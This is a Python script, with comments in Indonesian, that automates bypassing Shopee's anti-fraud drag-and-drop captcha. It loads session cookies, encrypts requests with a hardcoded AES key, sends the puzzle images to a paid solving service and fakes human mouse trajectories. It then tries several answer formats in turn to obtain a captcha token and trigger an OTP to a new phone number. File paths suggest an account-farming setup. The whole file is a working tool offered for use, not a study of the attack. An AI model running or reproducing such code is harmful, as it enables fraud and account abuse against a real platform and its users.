"""ANSWER_MATRIX.py — brute format captcha_answer untuk type 10/11 (dragdrop 2D).

Jalur yang SUDAH TERBUKTI (FINAL_OTP.py):
  generate via requests -> err=0, captcha type=10/11, bg besar
  SadCaptcha -> prop valid
  verify -> 31500200 (format answer salah)

Type 10/11 punya y_coordinate -> dragdrop 2D, bukan slider 1D.

Matrix yang dicoba:
  1. {captcha_id, slider:{x_pixels}}
  2. {captcha_id, slider:{x_pixels, y_pixels}}
  3. {captcha_id, dragdrop:{x_pixels, y_pixels}}
  4. {captcha_id, slider:{x_pixels}, animated:null}
  5. {captcha_id, x_pixels}
  6. string "x,y"
  7. int x
  8. {captcha_id, slider:{x_pixels, y_pixels}, dfp_token}
  9. {captcha_id, image:{x_pixels,y_pixels}}

Setiap varian butuh captcha BARU (kalau 31500000 = consumed).
Jadi: generate baru per varian, tapi rate-limit -> jeda 30s antar generate.
"""
import json, sys, time, os, base64, hashlib
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

CK = sys.argv[1] if len(sys.argv) > 1 else "ck_new234.txt"
NEWPHONE = sys.argv[2] if len(sys.argv) > 2 else "6282323737822"
PROXY = "http://127.0.0.1:18080"
AESK = b"dRgUkXp2r5u8x/A?D(G+KbPeShVmYq3t"
SADKEY = open("/root/shopee-farm/bot_key.txt").read().strip()
SEC = open("/root/shopee-verify/SEC.txt").read().strip() if os.path.exists("/root/shopee-verify/SEC.txt") else ""
DFP = open("/root/shopee-verify/DFP_TOKEN.txt").read().strip() if os.path.exists("/root/shopee-verify/DFP_TOKEN.txt") else ""
T0 = time.time()


def log(*a):
    m = f"[{int(time.time()-T0):4d}s] " + " ".join(str(x) for x in a)
    print(m, flush=True)
    open("/root/shopee-verify/AM.log", "a").write(m + "\n")


def evp(pw, salt):
    d, prev = b"", b""
    while len(d) < 48:
        prev = hashlib.md5(prev + pw + salt).digest()
        d += prev
    return d[:32], d[32:48]


def enc(o):
    salt = os.urandom(8)
    k, iv = evp(AESK, salt)
    ct = AES.new(k, AES.MODE_CBC, iv).encrypt(
        pad(json.dumps(o, separators=(",", ":")).encode(), 16))
    return base64.b64encode(b"Salted__" + salt + ct).decode()


def dec(b):
    try:
        raw = base64.b64decode(b)
        if not raw.startswith(b"Salted__"):
            return {"_plain": raw[:150].decode("utf8", "ignore")}
        k, iv = evp(AESK, raw[8:16])
        return json.loads(unpad(AES.new(k, AES.MODE_CBC, iv).decrypt(raw[16:]), 16))
    except Exception as e:
        return {"_err": str(e)[:50]}


ck = open(CK).read().strip()
cookies = {p.split("=", 1)[0].strip(): p.split("=", 1)[1].strip()
           for p in ck.split(";") if "=" in p}
s = requests.Session()
s.cookies.update(cookies)
s.proxies = {"http": PROXY, "https": PROXY}
s.headers.update({
    "user-agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"),
    "x-api-source": "pc", "x-requested-with": "XMLHttpRequest",
    "referer": "https://shopee.co.id/", "accept": "application/json",
    "content-type": "application/json",
    "x-csrftoken": cookies.get("csrftoken", ""),
    "af-ac-enc-dat": "0123456789abcdef", "x-sz-sdk-version": "1.12.45"})


def post(p, b=None):
    r = s.post(f"https://shopee.co.id{p}", json=b or {}, timeout=55)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, {"_raw": r.text[:200]}


log(f"=== {cookies.get('SPC_U')} -> {NEWPHONE} ===")
log(f"  SEC {len(SEC)}B | DFP {len(DFP)}B")

TRK = ""
for f in ("TRK_OS.txt",):
    if os.path.exists(f):
        TRK = open(f).read().strip()
        if TRK:
            break
if not TRK:
    TRK = open("/root/shopee-verify/TRACKING.txt").read().strip()

log(f"  TRK {len(TRK)}B")

# === settings ===
st, j = post("/api/v4/otp/get_settings_v2", {"operation": 8, "phone": NEWPHONE})
d = j.get("data") or {}
seed = d.get("seed")
log(f"  settings err={j.get('error')} channels={d.get('available_channels')}")

# === generate + solve + verify matrix ===
for rnd in range(3):
    log(f"\n{'='*55}\nROUND {rnd+1}: generate\n{'='*55}")

    p = {"app_key": "FlashSale.PC", "scene": "crawler_item", "captcha_type": 1,
         "image_version": "", "client_id": cookies.get("SPC_CLIENTID", ""),
         "captcha_extra_info": {"tracking_id": TRK}, "captcha_id": ""}
    st, jg = post("/api/v4/anti_fraud/captcha/generate",
                  {"encrypted_data": enc(p)})
    jjg = dec(jg["encrypted_data"]) if jg.get("encrypted_data") else jg
    err = jjg.get("error")
    data = jjg.get("data") or {}
    body = data.get("captcha_body") or {}

    log(f"  gen err={err} id={str(data.get('captcha_id',''))[:36]} "
        f"type={data.get('captcha_type')}")
    log(f"  bg={len(body.get('bg_img') or '')}B pz={len(body.get('puzzle_img') or '')}B "
        f"y={body.get('y_coordinate')}")

    if err != 0 or not body.get("bg_img"):
        log(f"  ⛔ generate gagal (err={err})")
        if err == 31500000:
            log("     window tertutup — jeda 60s lalu ulang")
            time.sleep(60)
            continue
        break

    CAPID = data.get("captcha_id")
    TRKU = data.get("tracking_id")
    CTYPE = data.get("captcha_type")
    SAMPL = data.get("sampling_frequency") or 20
    YC = body.get("y_coordinate") or 0
    bg = body["bg_img"]
    pz = body["puzzle_img"]
    json.dump(jjg, open(f"/root/shopee-verify/AM_CAP{rnd}.json", "w"), indent=1)

    # solve
    prop = None
    try:
        rr = requests.post("https://www.sadcaptcha.com/api/v1/puzzle",
                           params={"licenseKey": SADKEY},
                           json={"puzzleImageB64": bg.split(",", 1)[1],
                                 "pieceImageB64": pz.split(",", 1)[1]}, timeout=75)
        log(f"  sad {rr.status_code} {rr.text[:90]}")
        if rr.status_code == 200:
            prop = rr.json().get("slideXProportion")
    except Exception as e:
        log(f"  sad err {str(e)[:50]}")

    if prop is None:
        log("  ⛔ solve gagal")
        time.sleep(20)
        continue

    W = 280
    tx = round(prop * W, 1)
    log(f"  prop={prop} x={tx} y={YC}")

    # trajectory
    t0 = int(time.time() * 1000)
    evs = []
    STEPS = max(20, SAMPL)
    for i in range(STEPS):
        pr = (i + 1) / STEPS
        e = pr * pr * (3 - 2 * pr)
        ts = t0 + int(900 * pr)
        evs.append([round(e * tx, 1), round(e * YC, 1), ts, 1])
    evs.append([tx, YC, t0 + 1180, 2])

    ua = {"slider_start_timestamp": t0, "slider_end_timestamp": t0 + 1180,
          "mouse_events": evs, "touch_events": [],
          "device_orientation_events": [],
          "captcha": {"slider_start_timestamp": t0,
                      "slider_end_timestamp": t0 + 1180,
                      "has_slidable_puzzle": True},
          "audio": {}}

    IX = int(round(tx))
    IY = int(round(YC))

    VARIANTS = [
        ("obj-slider-xy", {"captcha_id": CAPID,
                           "slider": {"x_pixels": IX, "y_pixels": IY}}),
        ("obj-slider-x", {"captcha_id": CAPID, "slider": {"x_pixels": IX}}),
        ("obj-dragdrop", {"captcha_id": CAPID,
                          "dragdrop": {"x_pixels": IX, "y_pixels": IY}}),
        ("obj-puzzle", {"captcha_id": CAPID,
                        "puzzle": {"x_pixels": IX, "y_pixels": IY}}),
        ("obj-xy-flat", {"captcha_id": CAPID,
                         "x_pixels": IX, "y_pixels": IY}),
        ("int", IX),
        ("str-xy", f"{IX},{IY}"),
        ("obj-cid-only", {"captcha_id": CAPID}),
    ]

    for nm, ans in VARIANTS:
        pv = {"app_key": "FlashSale.PC", "scene": "crawler_item",
              "captcha_type": CTYPE, "captcha_answer": ans,
              "user_action": json.dumps(ua),
              "phone": NEWPHONE, "email": "", "username": "",
              "captcha_extra_info": {"tracking_id": TRKU},
              "captcha_id": CAPID}

        st2, jv = post("/api/v4/anti_fraud/captcha/verify", {
            "encrypted_data": enc(pv),
            "encrypted_security_data": SEC,
            "dfp_token": DFP})
        jjv = dec(jv["encrypted_data"]) if jv.get("encrypted_data") else jv
        e2 = jjv.get("error")
        log(f"  [{nm}] err={e2} {json.dumps(jjv)[:160]}")

        if e2 == 0:
            dd = jjv.get("data") or {}
            tok = (dd.get("captcha_token") or dd.get("token")
                   or dd.get("verify_token") or dd.get("signature") or "")
            log(f"  🎉🎉🎉 SUCCESS via [{nm}] token={len(str(tok))}B")
            json.dump({"variant": nm, "token": tok, "raw": jjv},
                      open("/root/shopee-verify/AM_WIN.json", "w"), indent=1)

            # send vcode
            log("\n  >> send_vcode WA")
            for ch in (3, 2, 1):
                b = {"phone": NEWPHONE, "channel": ch, "operation": 8, "seed": seed}
                if tok:
                    b["captcha_token"] = tok
                st3, j3 = post("/api/v4/otp/send_vcode", b)
                log(f"     ch={ch} err={j3.get('error')} {json.dumps(j3)[:170]}")
                if j3.get("error") == 0:
                    d3 = j3.get("data") or {}
                    log(f"\n  ✅✅✅✅ OTP TERKIRIM ch={ch}")
                    log(f"      tracking = {d3.get('otp_tracking_id')}")
                    json.dump({"phone": NEWPHONE, "ch": ch, "seed": seed,
                               "otp_tracking_id": d3.get("otp_tracking_id"),
                               "captcha_token": tok},
                              open("/root/shopee-verify/OTP_SENT.json", "w"), indent=1)
                    sys.exit(0)
                time.sleep(2)
            sys.exit(0)

        if e2 == 31500000:
            log("    ⚠️ captcha consumed — stop varian, generate baru")
            break
        time.sleep(1)

    log("  jeda 45s sebelum round berikut")
    time.sleep(45)

log("\n=== SELESAI ===")
